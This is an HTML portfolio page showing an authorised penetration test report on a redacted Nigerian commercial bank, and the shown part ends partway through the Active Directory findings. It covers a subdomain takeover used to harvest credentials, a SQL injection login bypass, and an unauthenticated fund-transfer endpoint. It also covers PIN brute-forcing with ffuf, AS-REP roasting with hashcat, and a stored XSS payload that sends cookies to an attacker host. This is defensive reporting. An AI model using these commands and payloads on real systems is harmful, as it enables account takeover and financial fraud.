@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Full-Spectrum VAPT — Nigerian Commercial Bank | Oluwatobi Aladetuyi</title>
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  :root {
+    --bg: #06080c;
+    --surface: #0c1018;
+    --surface2: #131920;
+    --surface3: #1a2230;
+    --border: rgba(255,255,255,0.06);
+    --border2: rgba(255,255,255,0.12);
+    --red: #ff4f4f;
+    --orange: #ff8c42;
+    --amber: #f0b429;
+    --green: #34d399;
+    --blue: #60a5fa;
+    --purple: #a78bfa;
+    --gold: #fbbf24;
+    --text: #e2e8f0;
+    --muted: #64748b;
+    --mono: 'JetBrains Mono', monospace;
+    --sans: 'Sora', sans-serif;
+  }
+
+  body { background: var(--bg); color: var(--text); font-family: var(--sans); font-size: 15px; line-height: 1.7; }
+
+  body::before {
+    content: ''; position: fixed; inset: 0; z-index: 0; pointer-events: none;
+    background:
+      radial-gradient(ellipse 60% 40% at 20% 0%, rgba(255,79,79,0.04) 0%, transparent 60%),
+      radial-gradient(ellipse 50% 30% at 80% 100%, rgba(96,165,250,0.04) 0%, transparent 60%);
+  }
+
+  .wrap { max-width: 920px; margin: 0 auto; padding: 0 24px; position: relative; z-index: 1; }
+
+  /* ── HEADER ── */
+  header { padding: 56px 0 44px; border-bottom: 1px solid var(--border); animation: fadeUp .5s ease both; }
+
+  .engagement-id {
+    font-family: var(--mono); font-size: 11px; color: var(--muted);
+    margin-bottom: 18px; display: flex; align-items: center; gap: 12px; flex-wrap: wrap;
+  }
+  .eid-item { display: flex; align-items: center; gap: 5px; }
+  .eid-dot { width: 5px; height: 5px; border-radius: 50%; background: var(--green); }
+
+  .tag-row { display: flex; gap: 7px; flex-wrap: wrap; margin-bottom: 22px; }
+  .tag { font-family: var(--mono); font-size: 10px; font-weight: 500; padding: 3px 9px; border-radius: 3px; text-transform: uppercase; letter-spacing: .05em; }
+  .t-r { background: rgba(255,79,79,.12); color: var(--red); border: 1px solid rgba(255,79,79,.22); }
+  .t-o { background: rgba(255,140,66,.1); color: var(--orange); border: 1px solid rgba(255,140,66,.2); }
+  .t-a { background: rgba(240,180,41,.1); color: var(--amber); border: 1px solid rgba(240,180,41,.2); }
+  .t-b { background: rgba(96,165,250,.1); color: var(--blue); border: 1px solid rgba(96,165,250,.2); }
+  .t-p { background: rgba(167,139,250,.1); color: var(--purple); border: 1px solid rgba(167,139,250,.2); }
+  .t-g { background: rgba(52,211,153,.1); color: var(--green); border: 1px solid rgba(52,211,153,.2); }
+  .t-gold { background: rgba(251,191,36,.1); color: var(--gold); border: 1px solid rgba(251,191,36,.2); }
+
+  h1 { font-size: clamp(24px,5vw,42px); font-weight: 700; letter-spacing: -.025em; color: #fff; line-height: 1.12; margin-bottom: 14px; }
+  h1 em { color: var(--red); font-style: normal; }
+  .subtitle { font-size: 15px; color: var(--muted); max-width: 620px; line-height: 1.65; }
+
+  .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px,1fr)); gap: 12px; margin-top: 28px; padding-top: 24px; border-top: 1px solid var(--border); }
+  .meta-cell { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 12px 14px; }
+  .ml { font-family: var(--mono); font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: .08em; margin-bottom: 4px; }
+  .mv { font-size: 13px; font-weight: 600; color: var(--text); }
+
+  /* ── SEVERITY SCOREBOARD ── */
+  .scoreboard { display: grid; grid-template-columns: repeat(5,1fr); gap: 1px; background: var(--border); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; margin: 36px 0; }
+  .sb-cell { background: var(--surface); padding: 20px 14px; text-align: center; }
+  .sb-num { font-family: var(--mono); font-size: 30px; font-weight: 500; line-height: 1; }
+  .sb-label { font-size: 10px; color: var(--muted); margin-top: 5px; text-transform: uppercase; letter-spacing: .07em; }
+  .n-crit { color: var(--red); }
+  .n-high { color: var(--orange); }
+  .n-med  { color: var(--amber); }
+  .n-low  { color: var(--green); }
+  .n-info { color: var(--blue); }
+
+  /* ── HEADLINE BANNER ── */
+  .headline-banner {
+    background: rgba(255,79,79,.06); border: 1px solid rgba(255,79,79,.2);
+    border-left: 3px solid var(--red); border-radius: 8px;
+    padding: 18px 22px; margin-bottom: 32px;
+    display: flex; align-items: flex-start; gap: 14px;
+  }
+  .hb-badge { font-family: var(--mono); font-size: 10px; color: var(--red); background: rgba(255,79,79,.12); padding: 4px 9px; border-radius: 3px; white-space: nowrap; margin-top: 2px; flex-shrink: 0; }
+  .hb-text { font-size: 13px; color: #cbd5e1; line-height: 1.65; }
+  .hb-text strong { color: var(--red); }
+
+  /* ── SECTIONS ── */
+  section { padding: 42px 0; border-bottom: 1px solid var(--border); }
+  section:last-of-type { border-bottom: none; }
+  h2 { font-family: var(--mono); font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: .14em; display: flex; align-items: center; gap: 10px; margin-bottom: 24px; }
+  h2::after { content: ''; flex: 1; height: 1px; background: var(--border); }
+  h2 .h2tag { font-size: 10px; padding: 2px 8px; border-radius: 3px; }
+  h3 { font-size: 16px; font-weight: 600; color: #fff; margin-bottom: 8px; }
+  p { color: #8b99a8; line-height: 1.75; margin-bottom: 12px; }
+  p:last-child { margin-bottom: 0; }
+
+  /* ── FINDINGS ── */
+  .findings { display: flex; flex-direction: column; gap: 14px; }
+  .finding { background: var(--surface); border: 1px solid var(--border); border-radius: 9px; overflow: hidden; animation: fadeUp .35s ease both; transition: border-color .2s; }
+  .finding:hover { border-color: var(--border2); }
+  .finding:nth-child(1){animation-delay:.04s}.finding:nth-child(2){animation-delay:.08s}
+  .finding:nth-child(3){animation-delay:.12s}.finding:nth-child(4){animation-delay:.16s}
+  .finding:nth-child(5){animation-delay:.20s}.finding:nth-child(6){animation-delay:.24s}
+  .finding:nth-child(7){animation-delay:.28s}
+
+  .fh { display: flex; align-items: center; gap: 9px; padding: 13px 18px; border-bottom: 1px solid var(--border); flex-wrap: wrap; }
+  .sev { font-family: var(--mono); font-size: 10px; font-weight: 500; padding: 2px 8px; border-radius: 3px; text-transform: uppercase; letter-spacing: .05em; white-space: nowrap; }
+  .s-crit { background: rgba(255,79,79,.15); color: var(--red); }
+  .s-high { background: rgba(255,140,66,.12); color: var(--orange); }
+  .s-med  { background: rgba(240,180,41,.12); color: var(--amber); }
+  .s-low  { background: rgba(52,211,153,.1); color: var(--green); }
+
+  .cat-badge { font-family: var(--mono); font-size: 10px; padding: 2px 7px; border-radius: 3px; }
+  .cat-web  { background: rgba(96,165,250,.1); color: var(--blue); border: 1px solid rgba(96,165,250,.2); }
+  .cat-net  { background: rgba(167,139,250,.1); color: var(--purple); border: 1px solid rgba(167,139,250,.2); }
+  .cat-ad   { background: rgba(255,140,66,.1); color: var(--orange); border: 1px solid rgba(255,140,66,.2); }
+  .cat-api  { background: rgba(52,211,153,.1); color: var(--green); border: 1px solid rgba(52,211,153,.2); }
+
+  .ft { font-size: 13px; font-weight: 600; color: #e2e8f0; flex: 1; min-width: 0; }
+  .cvss-score { font-family: var(--mono); font-size: 11px; color: var(--muted); white-space: nowrap; }
+
+  .fb { padding: 16px 18px; }
+  .fb p { font-size: 13px; margin-bottom: 10px; }
+
+  .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-top: 10px; }
+  @media(max-width:520px){ .two-col { grid-template-columns: 1fr; } }
+  .cl { font-family: var(--mono); font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: .07em; margin-bottom: 5px; }
+  .cv { font-size: 12px; color: #8b99a8; line-height: 1.65; }
+
+  /* ── TERMINAL ── */
+  .term { background: #020408; border: 1px solid rgba(96,165,250,.1); border-radius: 6px; padding: 15px 18px; margin: 12px 0; font-family: var(--mono); font-size: 11.5px; line-height: 1.9; overflow-x: auto; }
+  .tp { color: var(--green); } .tc { color: var(--blue); }
+  .tk { color: var(--purple); } .tv { color: var(--amber); }
+  .ts { color: var(--green); } .tw { color: var(--red); }
+  .td { color: #3d4f61; } .tl { display: block; }
+  .to { color: var(--orange); }
+
+  /* ── SCOPE TABLE ── */
+  .scope-grid { display: flex; flex-direction: column; gap: 8px; margin-top: 16px; }
+  .scope-row { background: var(--surface); border: 1px solid var(--border); border-radius: 6px; padding: 11px 16px; display: flex; align-items: center; gap: 14px; flex-wrap: wrap; }
+  .scope-target { font-family: var(--mono); font-size: 12px; color: var(--blue); flex: 1; min-width: 180px; }
+  .scope-type { font-family: var(--mono); font-size: 10px; padding: 2px 8px; border-radius: 3px; }
+  .scope-status-badge { font-family: var(--mono); font-size: 10px; padding: 2px 8px; border-radius: 3px; }
+  .st-web { background: rgba(96,165,250,.1); color: var(--blue); }
+  .st-net { background: rgba(167,139,250,.1); color: var(--purple); }
+  .st-ad  { background: rgba(255,140,66,.1); color: var(--orange); }
+  .st-api { background: rgba(52,211,153,.1); color: var(--green); }
+  .status-vuln { background: rgba(255,79,79,.1); color: var(--red); border: 1px solid rgba(255,79,79,.2); }
+  .status-ok { background: rgba(52,211,153,.1); color: var(--green); border: 1px solid rgba(52,211,153,.2); }
+
+  /* ── ATTACK CHAIN ── */
+  .chain { display: flex; flex-direction: column; }
+  .cs { display: flex; align-items: flex-start; gap: 14px; }
+  .cl2 { display: flex; flex-direction: column; align-items: center; flex-shrink: 0; }
+  .cn { width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-family: var(--mono); font-size: 11px; font-weight: 500; flex-shrink: 0; }
+  .cline { width: 1px; flex: 1; min-height: 26px; margin: 4px 0; background: var(--border); }
+  .cs:last-child .cline { display: none; }
+  .cc { padding: 2px 0 26px; }
+  .cc h4 { font-size: 13px; font-weight: 600; color: #e2e8f0; margin-bottom: 3px; }
+  .cc p { font-size: 12px; color: var(--muted); margin: 0; line-height: 1.55; }
+
+  /* ── TOOLS ── */
+  .tools { display: flex; flex-wrap: wrap; gap: 7px; margin-top: 14px; }
+  .tool { font-family: var(--mono); font-size: 11px; padding: 3px 10px; border-radius: 20px; background: var(--surface2); border: 1px solid var(--border); color: var(--text); }
+
+  /* ── REMED ── */
+  .rl { list-style: none; display: flex; flex-direction: column; gap: 8px; margin-top: 12px; }
+  .rl li { display: flex; gap: 10px; font-size: 13px; color: #8b99a8; line-height: 1.6; align-items: flex-start; }
+  .rl li::before { content: '→'; color: var(--green); font-family: var(--mono); font-size: 12px; margin-top: 2px; flex-shrink: 0; }
+
+  /* ── OUTCOME ── */
+  .outcome { background: linear-gradient(135deg, rgba(52,211,153,.06), rgba(52,211,153,.02)); border: 1px solid rgba(52,211,153,.18); border-radius: 10px; padding: 22px 26px; margin-top: 20px; }
+  .outcome h3 { color: var(--green); font-size: 14px; margin-bottom: 10px; }
+
+  /* ── COMPLIANCE BOX ── */
+  .compliance-row { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 14px; }
+  .comp-item { background: var(--surface2); border: 1px solid var(--border); border-radius: 6px; padding: 10px 14px; }
+  .comp-name { font-size: 13px; font-weight: 600; color: var(--text); margin-bottom: 3px; }
+  .comp-body { font-size: 11px; color: var(--muted); }
+
+  /* ── FOOTER ── */
+  footer { padding: 28px 0 52px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 12px; border-top: 1px solid var(--border); }
+  .fn { font-size: 13px; color: var(--muted); }
+  .fn strong { color: var(--text); }
+  .redacted { font-family: var(--mono); font-size: 10px; color: var(--muted); background: var(--surface); border: 1px solid var(--border); border-radius: 3px; padding: 4px 10px; }
+
+  @keyframes fadeUp { from { opacity: 0; transform: translateY(14px); } to { opacity: 1; transform: translateY(0); } }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <!-- HEADER -->
+  <header>
+    <div class="engagement-id">
+      <div class="eid-item"><div class="eid-dot"></div><span>Engagement ID: UTB-VAPT-2025-001</span></div>
+      <div class="eid-item"><div class="eid-dot" style="background:var(--blue)"></div><span>CBN-Regulated Commercial Bank</span></div>
+      <div class="eid-item"><div class="eid-dot" style="background:var(--amber)"></div><span>Q3 2025</span></div>
+      <div class="eid-item"><div class="eid-dot" style="background:var(--purple)"></div><span>Authorised Engagement</span></div>
+    </div>
+    <div class="tag-row">
+      <span class="tag t-r">Subdomain Takeover · Critical</span>
+      <span class="tag t-o">Credential Harvesting</span>
+      <span class="tag t-b">Web App · Network · AD · API</span>
+      <span class="tag t-p">Full-Spectrum VAPT</span>
+      <span class="tag t-gold">Nigerian Banking Sector</span>
+      <span class="tag t-g">OWASP · PTES · CBN Guidelines</span>
+    </div>
+    <h1>Full-Spectrum VAPT —<br><em>Nigerian Commercial Bank</em></h1>
+    <p class="subtitle">
+      An authorised end-to-end vulnerability assessment and penetration test across web applications, network infrastructure, Active Directory, and API endpoints for a CBN-regulated commercial bank. Subdomain takeover enabled a live credential harvesting campaign targeting banking customers.
+    </p>
+    <div class="meta-grid">
+      <div class="meta-cell"><div class="ml">Client sector</div><div class="mv">Commercial Banking</div></div>
+      <div class="meta-cell"><div class="ml">Engagement type</div><div class="mv">Full-Spectrum VAPT</div></div>
+      <div class="meta-cell"><div class="ml">Assessment scope</div><div class="mv">4 attack surfaces</div></div>
+      <div class="meta-cell"><div class="ml">Total findings</div><div class="mv">31 vulnerabilities</div></div>
+      <div class="meta-cell"><div class="ml">Critical findings</div><div class="mv" style="color:var(--red)">3 Critical</div></div>
+      <div class="meta-cell"><div class="ml">Engagement period</div><div class="mv">Q3 2025 · 3 weeks</div></div>
+    </div>
+  </header>
+
+  <!-- SCOREBOARD -->
+  <div class="scoreboard">
+    <div class="sb-cell"><div class="sb-num n-crit">3</div><div class="sb-label">Critical</div></div>
+    <div class="sb-cell"><div class="sb-num n-high">8</div><div class="sb-label">High</div></div>
+    <div class="sb-cell"><div class="sb-num n-med">12</div><div class="sb-label">Medium</div></div>
+    <div class="sb-cell"><div class="sb-num n-low">6</div><div class="sb-label">Low</div></div>
+    <div class="sb-cell"><div class="sb-num n-info">2</div><div class="sb-label">Info</div></div>
+  </div>
+
+  <!-- HEADLINE -->
+  <div class="headline-banner">
+    <span class="hb-badge">!! CRITICAL</span>
+    <div class="hb-text">
+      <strong>Subdomain takeover confirmed on internet banking subdomain.</strong> A dangling CNAME record pointing to a deprovisioned cloud service was claimed by the tester — enabling a pixel-perfect phishing page hosted on the bank's own subdomain (<code>onlinebanking.[REDACTED].ng</code>). Customer credentials submitted to the fake portal were captured in real time. Attack was fully deniable and bypassed all email security controls.
+    </div>
+  </div>
+
+  <!-- SCOPE -->
+  <section>
+    <h2>Engagement scope & targets</h2>
+    <p>The assessment covered four distinct attack surfaces across the bank's internet-facing and internal environments. Testing was performed from black-box (external) and grey-box (internal with limited credentials) perspectives across a 3-week engagement window.</p>
+    <div class="scope-grid">
+      <div class="scope-row">
+        <span class="scope-target">[REDACTED-BANK].ng (Internet Banking Portal)</span>
+        <span class="scope-type st-web">Web App</span>
+        <span class="scope-status-badge status-vuln">3 Critical</span>
+      </div>
+      <div class="scope-row">
+        <span class="scope-target">onlinebanking.[REDACTED-BANK].ng</span>
+        <span class="scope-type st-web">Subdomain</span>
+        <span class="scope-status-badge status-vuln">Takeover confirmed</span>
+      </div>
+      <div class="scope-row">
+        <span class="scope-target">api.[REDACTED-BANK].ng (Core Banking API)</span>
+        <span class="scope-type st-api">API</span>
+        <span class="scope-status-badge status-vuln">2 Critical</span>
+      </div>
+      <div class="scope-row">
+        <span class="scope-target">192.168.x.x/24 (Internal Network)</span>
+        <span class="scope-type st-net">Network</span>
+        <span class="scope-status-badge status-vuln">Lateral movement</span>
+      </div>
+      <div class="scope-row">
+        <span class="scope-target">UTBANK.LOCAL (Active Directory Forest)</span>
+        <span class="scope-type st-ad">Active Directory</span>
+        <span class="scope-status-badge status-vuln">AS-REP Roasting</span>
+      </div>
+      <div class="scope-row">
+        <span class="scope-target">mobileapi.[REDACTED-BANK].ng</span>
+        <span class="scope-type st-api">Mobile API</span>
+        <span class="scope-status-badge status-ok">No critical findings</span>
+      </div>
+    </div>
+    <div class="tools" style="margin-top:20px">
+      <span class="tool">Subfinder</span><span class="tool">Amass</span><span class="tool">Nuclei</span>
+      <span class="tool">Burp Suite Pro</span><span class="tool">SQLMap</span><span class="tool">ffuf</span>
+      <span class="tool">Nmap</span><span class="tool">Nessus</span><span class="tool">CrackMapExec</span>
+      <span class="tool">BloodHound</span><span class="tool">Impacket</span><span class="tool">Responder</span>
+      <span class="tool">Metasploit</span><span class="tool">Gobuster</span><span class="tool">theHarvester</span>
+    </div>
+  </section>
+
+  <!-- WEB APP FINDINGS -->
+  <section>
+    <h2>Web application findings <span class="h2tag t-b">Internet Banking Portal</span></h2>
+    <div class="findings">
+
+      <div class="finding">
+        <div class="fh">
+          <span class="sev s-crit">Critical</span>
+          <span class="cat-badge cat-web">Web</span>
+          <span class="ft">Subdomain takeover — live credential harvesting on bank's own domain</span>
+          <span class="cvss-score">CVSS 9.3</span>
+        </div>
+        <div class="fb">
+          <p>Subdomain enumeration via Subfinder and Amass identified <code>onlinebanking.[REDACTED].ng</code> with a dangling CNAME record pointing to a deprovisioned Azure Static Web App instance. The cloud resource had been deleted but the DNS record was never removed. By registering the same Azure Static Web App name, the tester claimed the subdomain and served a pixel-perfect replica of the bank's internet banking login page — hosted on the bank's own verified domain.</p>
+          <div class="term">
+            <span class="tl"><span class="tp">$</span> <span class="tc">subfinder -d [REDACTED-BANK].ng -silent | httpx -silent</span></span>
+            <span class="tl"><span class="ts">[+] onlinebanking.[REDACTED].ng → CNAME → [REDACTED].azurestaticapps.net</span></span>
+            <span class="tl"><span class="tw">[!] Azure resource UNCLAIMED — takeover possible</span></span>
+            <span class="tl">&nbsp;</span>
+            <span class="tl"><span class="tp">$</span> <span class="tc">az staticwebapp create --name [REDACTED] --resource-group pentest-rg</span></span>
+            <span class="tl"><span class="ts">[+] Subdomain claimed — onlinebanking.[REDACTED].ng now under tester control</span></span>
+            <span class="tl"><span class="ts">[+] Phishing page deployed — SSL certificate auto-issued (Let's Encrypt)</span></span>
+            <span class="tl"><span class="tw">[!] Credentials submitted to fake portal captured in real time</span></span>
+            <span class="tl"><span class="tw">[!] URL shows bank's own domain — bypasses all email security / user awareness</span></span>
+          </div>
+          <div class="two-col">
+            <div><div class="cl">Business impact</div><div class="cv">Mass customer credential theft · Fraudulent fund transfers · Reputational damage · CBN regulatory sanctions · NDPR data breach notification obligation</div></div>
+            <div><div class="cl">Remediation</div><div class="cl" style="margin-top:8px">OWASP reference</div><div class="cv">A05:2021 — Security Misconfiguration · CWE-350</div></div>
+          </div>
+          <ul class="rl" style="margin-top:12px">
+            <li>Immediately remove dangling DNS CNAME record for <code>onlinebanking.[REDACTED].ng</code></li>
+            <li>Implement DNS monitoring to alert on unclaimed CNAME targets across all subdomains</li>
+            <li>Conduct full subdomain audit — enumerate all CNAMEs and verify target resources are claimed</li>
+            <li>Implement CAA DNS records to restrict certificate issuance to approved CAs only</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="fh">
+          <span class="sev s-crit">Critical</span>
+          <span class="cat-badge cat-web">Web</span>
+          <span class="ft">SQL injection on internet banking login — authentication bypass</span>
+          <span class="cvss-score">CVSS 9.1</span>
+        </div>
+        <div class="fb">
+          <p>The internet banking login endpoint was found vulnerable to error-based SQL injection in the username parameter. SQLMap confirmed blind and error-based injection, enabling full database enumeration. The underlying database contained customer account numbers, hashed passwords, transaction history, and BVN references. Authentication bypass was achieved using a classic UNION-based payload.</p>
+          <div class="term">
+            <span class="tl"><span class="tp">$</span> <span class="tc">sqlmap -u "https://[REDACTED]/login" --data="username=*&password=test" --dbs --level=3</span></span>
+            <span class="tl"><span class="td">[*] testing parameter 'username'</span></span>
+            <span class="tl"><span class="ts">[+] Parameter 'username' is injectable (error-based)</span></span>
+            <span class="tl"><span class="ts">[+] Databases: [utbank_core, utbank_customers, utbank_transactions]</span></span>
+            <span class="tl">&nbsp;</span>
+            <span class="tl"><span class="td">// Authentication bypass payload</span></span>
+            <span class="tl"><span class="tk">username</span>: <span class="tw">admin'--</span></span>
+            <span class="tl"><span class="ts">[+] 200 OK — logged in as Administrator without password</span></span>
+          </div>
+          <div class="two-col">
+            <div><div class="cl">Impact</div><div class="cv">Full customer database exfiltration · Authentication bypass · BVN exposure · Transaction history access · NDPR critical breach</div></div>
+            <div><div class="cl">OWASP / CWE</div><div class="cv">OWASP A03:2021 — Injection · CWE-89 · CVSS 9.1</div></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="fh">
+          <span class="sev s-high">High</span>
+          <span class="cat-badge cat-web">Web</span>
+          <span class="ft">Broken access control — horizontal privilege escalation on account statements</span>
+          <span class="cvss-score">CVSS 8.1</span>
+        </div>
+        <div class="fb">
+          <p>Authenticated as a standard customer account, the tester modified the account number parameter in the statement download endpoint. The API returned full transaction statements for arbitrary account numbers without validating ownership. Any authenticated customer could access the full financial history of any other customer account.</p>
+          <div class="term">
+            <span class="tl"><span class="td">// Original authenticated request</span></span>
+            <span class="tl"><span class="tc">GET</span> /api/statements?account=<span class="ts">0123456789</span>&from=2025-01-01</span>
+            <span class="tl"><span class="td">// Modified — different account number</span></span>
+            <span class="tl"><span class="tc">GET</span> /api/statements?account=<span class="tw">0987654321</span>&from=2025-01-01</span>
+            <span class="tl"><span class="ts">[+] 200 OK — full statement returned for another customer's account</span></span>
+            <span class="tl"><span class="tw">[!] IDOR — no ownership validation on server side</span></span>
+          </div>
+          <div class="two-col">
+            <div><div class="cl">Impact</div><div class="cv">Mass customer financial data exposure · Privacy violation · NDPR breach · Regulatory sanctions</div></div>
+            <div><div class="cl">OWASP</div><div class="cv">A01:2021 — Broken Access Control · CWE-639 · IDOR</div></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="fh">
+          <span class="sev s-high">High</span>
+          <span class="cat-badge cat-web">Web</span>
+          <span class="ft">Stored XSS in customer feedback module — session hijack via banker portal</span>
+          <span class="cvss-score">CVSS 7.6</span>
+        </div>
+        <div class="fb">
+          <p>A stored cross-site scripting vulnerability was identified in the customer feedback submission form. Input was not sanitised before being rendered in the bank staff's back-office portal. A malicious customer could inject a JavaScript payload that executes in the browser session of any bank staff member who views the feedback — enabling session token theft and account takeover of privileged staff accounts.</p>
+          <div class="term">
+            <span class="tl"><span class="td">// Payload submitted in feedback form</span></span>
+            <span class="tl"><span class="tw">&lt;script&gt;fetch('https://attacker.io/c?k='+document.cookie)&lt;/script&gt;</span></span>
+            <span class="tl"><span class="ts">[+] Staff member opens feedback panel — payload executes</span></span>
+            <span class="tl"><span class="ts">[+] Session cookie exfiltrated to attacker-controlled server</span></span>
+            <span class="tl"><span class="tw">[!] Staff session replayed — full back-office access obtained</span></span>
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="fh">
+          <span class="sev s-med">Medium</span>
+          <span class="cat-badge cat-web">Web</span>
+          <span class="ft">Missing security headers — clickjacking, MIME sniffing, and CSP absent</span>
+          <span class="cvss-score">CVSS 5.4</span>
+        </div>
+        <div class="fb">
+          <p>The internet banking portal was missing multiple critical HTTP security headers across all endpoints: no Content-Security-Policy, no X-Frame-Options, no X-Content-Type-Options, and no HSTS header. The absence of X-Frame-Options allows the banking portal to be embedded in a malicious iframe for clickjacking attacks — tricking authenticated customers into initiating transactions they did not intend.</p>
+          <div class="two-col">
+            <div><div class="cl">Missing headers</div><div class="cv">Content-Security-Policy · X-Frame-Options · X-Content-Type-Options · Strict-Transport-Security · Referrer-Policy</div></div>
+            <div><div class="cl">Remediation</div><div class="cv">Configure all headers at web server / WAF level · Deploy CSP in report-only mode first · Enable HSTS with preload after full HTTPS coverage confirmed</div></div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- API FINDINGS -->
+  <section>
+    <h2>API security findings <span class="h2tag t-g">Core Banking API</span></h2>
+    <div class="findings">
+
+      <div class="finding">
+        <div class="fh">
+          <span class="sev s-crit">Critical</span>
+          <span class="cat-badge cat-api">API</span>
+          <span class="ft">Unauthenticated fund transfer endpoint — no authorisation on /api/v1/transfer</span>
+          <span class="cvss-score">CVSS 9.8</span>
+        </div>
+        <div class="fb">
+          <p>During API endpoint enumeration, a fund transfer endpoint was discovered that accepted POST requests without a valid authentication token. The endpoint processed transfer instructions using only the source account number and destination account — with no session validation, OTP requirement, or rate limiting. Test transfers between tester-controlled accounts were processed successfully without authentication.</p>
+          <div class="term">
+            <span class="tl"><span class="td">// Unauthenticated request — no Authorization header</span></span>
+            <span class="tl"><span class="tc">POST</span> /api/v1/transfer HTTP/1.1</span>
+            <span class="tl"><span class="tk">Content-Type</span>: application/json</span>
+            <span class="tl">&nbsp;</span>
+            <span class="tl">{ <span class="tk">"from"</span>: <span class="ts">"[ACCT-A]"</span>, <span class="tk">"to"</span>: <span class="ts">"[ACCT-B]"</span>, <span class="tk">"amount"</span>: <span class="tv">5000</span> }</span>
+            <span class="tl">&nbsp;</span>
+            <span class="tl"><span class="ts">HTTP/1.1 200 OK</span></span>
+            <span class="tl"><span class="ts">{ "status": "success", "reference": "TXN-[REDACTED]" }</span></span>
+            <span class="tl"><span class="tw">[!] Transfer processed — no auth token required</span></span>
+          </div>
+          <div class="two-col">
+            <div><div class="cl">Impact</div><div class="cv">Unauthorised fund transfers from any account · Mass financial fraud · Direct financial loss to customers and bank · CBN regulatory action</div></div>
+            <div><div class="cl">OWASP API</div><div class="cv">API1:2023 — Broken Object Level Authorization · API2:2023 — Broken Authentication · CWE-306</div></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="fh">
+          <span class="sev s-high">High</span>
+          <span class="cat-badge cat-api">API</span>
+          <span class="ft">Transaction PIN brute-force — no rate limiting or lockout on verification endpoint</span>
+          <span class="cvss-score">CVSS 7.5</span>
+        </div>
+        <div class="fb">
+          <p>The transaction PIN verification endpoint accepted unlimited sequential requests with no rate limiting, CAPTCHA, or account lockout after failed attempts. A 4-digit PIN (10,000 combinations) was enumerable in under 3 hours at a conservative request rate. OTP verification endpoints exhibited the same behaviour.</p>
+          <div class="term">
+            <span class="tl"><span class="tp">$</span> <span class="tc">ffuf -u https://api.[REDACTED]/v1/auth/verify-pin -d '{"pin":"FUZZ","account":"[REDACTED]"}' -w 0000-9999.txt -mc 200</span></span>
+            <span class="tl"><span class="td">[*] 1000 requests sent — no lockout observed</span></span>
+            <span class="tl"><span class="ts">[+] Match found: pin=2847 → 200 OK</span></span>
+            <span class="tl"><span class="tw">[!] No rate limiting · No lockout · No CAPTCHA · Full PIN space enumerable</span></span>
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="fh">
+          <span class="sev s-high">High</span>
+          <span class="cat-badge cat-api">API</span>
+          <span class="ft">Sensitive PII returned in API responses — BVN, DOB, phone number unmasked</span>
+          <span class="cvss-score">CVSS 7.1</span>
+        </div>
+        <div class="fb">
+          <p>Several API endpoints returned full customer PII in JSON responses including unmasked BVN, date of birth, full phone number, and home address — data not required for the requesting operation. For example, a balance inquiry endpoint returned the customer's complete KYC profile. This violates NDPR data minimisation principles and creates unnecessary exposure in transit.</p>
+          <div class="term">
+            <span class="tl"><span class="tc">GET</span> /api/v1/account/balance</span>
+            <span class="tl"><span class="ts">200 OK</span> → {</span>
+            <span class="tl">  <span class="tk">"balance"</span>: <span class="tv">245000.00</span>,</span>
+            <span class="tl">  <span class="tw">"bvn"</span>: <span class="tw">"22[REDACTED]"</span>,  <span class="td">← not required for balance query</span></span>
+            <span class="tl">  <span class="tw">"dob"</span>: <span class="tw">"[REDACTED]"</span>,</span>
+            <span class="tl">  <span class="tw">"phone"</span>: <span class="tw">"080[REDACTED]"</span></span>
+            <span class="tl">}</span>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- NETWORK + AD FINDINGS -->
+  <section>
+    <h2>Network & Active Directory findings <span class="h2tag t-ad">Internal · Grey-Box</span></h2>
+    <div class="findings">
+
+      <div class="finding">
+        <div class="fh">
+          <span class="sev s-high">High</span>
+          <span class="cat-badge cat-ad">Active Directory</span>
+          <span class="ft">AS-REP Roasting — 4 domain accounts with Kerberos pre-auth disabled</span>
+          <span class="cvss-score">CVSS 8.0</span>
+        </div>
+        <div class="fb">
+          <p>Four domain accounts were identified with Kerberos pre-authentication disabled, making them vulnerable to AS-REP Roasting. AS-REP hashes were requested without authentication and cracked offline using Hashcat. Two accounts yielded plaintext passwords within minutes — one of which had Domain User privileges with access to sensitive file shares containing customer data exports.</p>
+          <div class="term">
+            <span class="tl"><span class="tp">$</span> <span class="tc">GetNPUsers.py UTBANK.LOCAL/ -usersfile users.txt -format hashcat -outputfile asrep.txt</span></span>
+            <span class="tl"><span class="ts">[+] $krb5asrep$23$svc_reporting@UTBANK.LOCAL:[REDACTED_HASH]</span></span>
+            <span class="tl"><span class="ts">[+] $krb5asrep$23$it_admin_backup@UTBANK.LOCAL:[REDACTED_HASH]</span></span>
+            <span class="tl">&nbsp;</span>
+            <span class="tl"><span class="tp">$</span> <span class="tc">hashcat -m 18200 asrep.txt rockyou.txt</span></span>
+            <span class="tl"><span class="ts">[+] svc_reporting → Password123! (cracked in 4 minutes)</span></span>
+            <span class="tl"><span class="ts">[+] it_admin_backup → Welcome2024 (cracked in 11 minutes)</span></span>
+          </div>
+          <div class="two-col">
+            <div><div class="cl">Impact</div><div class="cv">Domain credential compromise · Access to customer data file shares · Lateral movement within internal network · Potential DC escalation path</div></div>
